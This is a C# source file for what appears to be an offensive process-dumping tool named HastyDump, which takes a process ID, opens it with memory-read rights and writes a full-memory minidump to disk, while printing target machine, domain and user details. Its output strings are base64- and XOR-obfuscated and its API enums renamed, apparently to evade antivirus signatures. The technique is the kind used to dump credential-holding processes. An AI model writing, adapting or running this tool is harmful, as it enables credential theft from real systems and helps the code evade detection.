using System;
using System.IO;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;

namespace ActionNamesapce
{
    class Program
    {
        // MINIDUMP_TYPE enum 
        public enum ENUM_1
        {
            // MiniDumpNormal
            ENUM_1_1 = 0x00000000,
            // MiniDumpWithDataSegs
            ENUM_1_2 = 0x00000001,
            // MiniDumpWithFullMemory
            ENUM_1_3 = 0x00000002,
            // MiniDumpWithHandleData
            ENUM_1_4 = 0x00000004,
            // MiniDumpFilterMemory
            ENUM_1_5 = 0x00000008,
            // MiniDumpScanMemory
            ENUM_1_6 = 0x00000010,
            // MiniDumpWithUnloadedModules
            ENUM_1_7 = 0x00000020,
            // MiniDumpWithIndirectlyReferencedMemory
            ENUM_1_8 = 0x00000040,
            // MiniDumpFilterModulePaths
            ENUM_1_9 = 0x00000080,
            // MiniDumpWithProcessThreadData
            ENUM_1_10 = 0x00000100,
            // MiniDumpWithPrivateReadWriteMemory
            ENUM_1_11 = 0x00000200,
            // MiniDumpWithoutOptionalData
            ENUM_1_12 = 0x00000400,
            // MiniDumpWithFullMemoryInfo
            ENUM_1_13 = 0x00000800,
            // MiniDumpWithThreadInfo
            ENUM_1_14 = 0x00001000,
            // MiniDumpWithCodeSegs
            ENUM_1_15 = 0x00002000
        }

        // ProcessAccessFlags enum
        public enum ENUM_2 : uint
        {
            // ALL
            ENUM_2_1 = 0x001F0FFF,
            // Terminate
            ENUM_2_2 = 0x00000001,
            // CreateThread
            ENUM_2_3 = 0x00000002,
            // VirtualMemoryOperation
            ENUM_2_4 = 0x00000008,
            // VirtualMemoryRead
            ENUM_2_5 = 0x00000010,
            // VirtualMemoryWrite
            ENUM_2_6 = 0x00000020,
            // DuplicateHandle
            ENUM_2_7 = 0x00000040,
            // CreateProcess
            ENUM_2_8 = 0x000000080,
            // SetQuota
            ENUM_2_9 = 0x00000100,
            // SetInformation
            ENUM_2_10 = 0x00000200,
            // QueryInformation
            ENUM_2_11 = 0x00000400,
            // QueryLimitedInformation
            ENUM_2_12 = 0x00001000,
            // Synchronize
            ENUM_2_13 = 0x00100000
        }

        // import dbghelp.dll
        [DllImport("dbghelp.dll")]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, Int32 ProcessId, IntPtr hFile, ENUM_1 DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallackParam);

        // import Kernel32.dll
        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern void CloseHandle(IntPtr handle);

        // import Kernel32.dll
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(ENUM_2 processAccess, bool bInheritHandle, int processId);

        [DllImport("psapi.dll", SetLastError = true)]
        static extern uint GetProcessImageFileName(
            IntPtr hProcess,
            [Out] StringBuilder lpImageFileName,
            [In] [MarshalAs(UnmanagedType.U4)] int nSize
        );


        // https://stackoverflow.com/questions/14971836/xor-ing-strings-in-c-sharp
        // encryptDecrypt XOR 
        private static string encDec(string input)
        {
            char[] key = { 'K', 'S', 'A' }; // Any chars will work, in an array of any size
            char[] output = new char[input.Length];

            for (int i = 0; i < input.Length; i++)
            {
                output[i] = (char)(input[i] ^ key[i % key.Length]);
            }

            return new string(output);
        }

        // Base64Decode Function
        public static string bDec(string base64EncodedData)
        {
            var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
            return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
        }

        static void Main(string[] args)
        {
            if (args.Count() < 2)
            {
                // No args passed show some help options
                // [*] Ussage: HastyDump.exe PROCCES_ID FULL_FILE_PATH
                Console.WriteLine(encDec(bDec("EHkcawYyODImLmlhAzIyPyoFPj4xZTY5LnMRGRwCCBYSFBoFaxUUBx8eDRoNDgwRCgcJ")));
                //    Example: HastyDump.exe 2182 'C:\\Users\\rt\\Desktop\\test.bin'
                Console.WriteLine(encDec(bDec("DisgJiMtLmlhAzIyPyoFPj4xZTY5LnNzemtza3QCcQ8dHiAkOSAdFyE1Fw8FLiAqPzwxFw81LiA1ZTEoJXQ=")));
                System.Environment.Exit(1);
            }
            IntPtr pHandle = IntPtr.Zero;
            bool retVal = false;
            int procId = int.Parse(args[0]);
            string dFile = args[1];
            StringBuilder procName = new StringBuilder(2000);
            FileStream fs = null;

            // print out setup
            // [*] RUNTIME TARGET CHECKS:
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine(encDec(bDec("EHkcawEUBQcIBhZhHxITDBYVaxAJDhAKGGk=")));
            // OperatingSystem Version:
            Console.WriteLine("\t" + encDec(bDec("BCMkOTI1Ij0mGCoyPzYsawUkOSAoJD17aw==")) + System.Environment.OSVersion);
            // Target MachineName: 
            Console.WriteLine("\t" + encDec(bDec("HzIzLDY1ax4gKDsoJTYPKj4kcXM=")) + System.Environment.MachineName);
            // Target DomainName:
            Console.WriteLine("\t" + encDec(bDec("HzIzLDY1axcuJjIoJR0gJjZ7aw==")) + System.Environment.UserDomainName);
            // Target UserName:
            Console.WriteLine("\t" + encDec(bDec("HzIzLDY1awYyLiEPKj4kcXM=")) + System.Environment.UserName);
            // Target Time Zone: 
            Console.WriteLine("\t" + encDec(bDec("HzIzLDY1awcoJjZhETwvLmlh")) + System.TimeZone.CurrentTimeZone.StandardName.ToString());
            // Target Time: 
            Console.WriteLine("\t" + encDec(bDec("HzIzLDY1awcoJjZ7aw==")) + DateTime.Now);
            // Target ProcessorCount: 
            Console.WriteLine("\t" + encDec(bDec("HzIzLDY1awMzJDAkOCAuORAuPj01cXM=")) + System.Environment.ProcessorCount);
            Console.ResetColor();

            // obtain process handle
            pHandle = OpenProcess(ENUM_2.ENUM_2_11 | ENUM_2.ENUM_2_5, false, procId);
            if (pHandle.ToInt32() == 0)
            {
                // Throws error
                Console.ForegroundColor = ConsoleColor.Red;
                // Console.WriteLine("[!] FAIL: open process handle error code: " + Marshal.GetLastWin32Error().ToString());
                Console.WriteLine(encDec(bDec("EHIcaxUAAh97azwxLj1hOyEuKDYyOHMpKj0lJzZhLiEzJCFhKDwlLmlh")) + Marshal.GetLastWin32Error().ToString());
                Console.ResetColor();
                System.Environment.Exit(1);
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Green;
                // [*] SUCCESS: Obtained process image name
                Console.WriteLine(encDec(bDec("EHkcawAUCBAEGAB7axwjPzIoJTYlayMzJDAkOCBhIj4gLDZhJTIsLg==")));
                Console.ResetColor();

            }
            // now target image name
            if (GetProcessImageFileName(pHandle, procName, 2000) == 0)
            {
                // procname failed
                Console.ForegroundColor = ConsoleColor.Red;
                // [!] FAIL: Unable to obtain process name error: 
                Console.WriteLine(encDec(bDec("EHIcaxUAAh97awYvKjEtLnM1JHMuKScgIj1hOyEuKDYyOHMvKj4kcXM=")) + Marshal.GetLastWin32Error().ToString());
                Console.ResetColor();
            }
            else
            {
                // procname successfull
                Console.ForegroundColor = ConsoleColor.Green;
                // [*] SUCCESS: Obtained process image name
                Console.WriteLine(encDec(bDec("EHkcawAUCBAEGAB7axwjPzIoJTYlayMzJDAkOCBhIj4gLDZhJTIsLg==")));
                Console.ResetColor();
                // [*] INFO: target image: 
                Console.WriteLine(encDec(bDec("EHkcaxoPDRx7aycgOTQkP3MoJjImLmlh")) + procName);
            }
            // now dump process
            if (File.Exists(dFile))
            {
                // file already is present on the system.
                Console.ForegroundColor = ConsoleColor.Red;
                // [!] FAIL: Dump file is already present on system.. cleanup or force deletion
                Console.WriteLine(encDec(bDec("EHIcaxUAAh97axc0JiNhLTotLnMoOHMgJyEkKjc4ayMzLiAkJSdhJD1hOCoyPzYsZX1hKD8kKj00O3MuOXMnJCEiLnMlLj8kPzouJQ==")));
                // open and rewrite file
                fs = new FileStream(dFile, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
            }
            else
            {
                fs = new FileStream(dFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write);
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine(encDec(bDec("EHkcawAUCBAEGAB7axAzLjI1Ij0mazUoJzZhOCczLjIsZDsgJTctLmlh")) + dFile);
                Console.ResetColor();
            }
            using (fs)
            {
                // allow constructor+deconstructor
                retVal = MiniDumpWriteDump(pHandle, procId, fs.SafeFileHandle.DangerousGetHandle(), ENUM_1.ENUM_1_3, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
                // [*] IMAGE TARGET DETAILS:
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine(encDec(bDec("EHkcaxoMChQEawcAGRQEH3MFDgcAAh8ScQ==")));
                // Image location: 
                Console.WriteLine("\t" + encDec(bDec("Aj4gLDZhODo7Lmlh")) + fs.Length / 1024 + " KB");
                Console.WriteLine("\t" + encDec(bDec("Aj4gLDZhJzwiKicoJD17aw==")) + Path.GetFullPath(dFile));
            }
        
            // Cleanup
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine(encDec(bDec("EHkcaxoPDRx7axAtJCAkazUoJzZhIzIvLz8kazwncXM=")) + dFile);
            fs.Close();

            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine(encDec(bDec("EHkcaxoPDRx7axAtJCAkayMzJDAkOCBhIzIvLz8kazwnayMzJDAkOCBhAhd7aw==")) + procId);
            CloseHandle(pHandle);
        }
    }
}
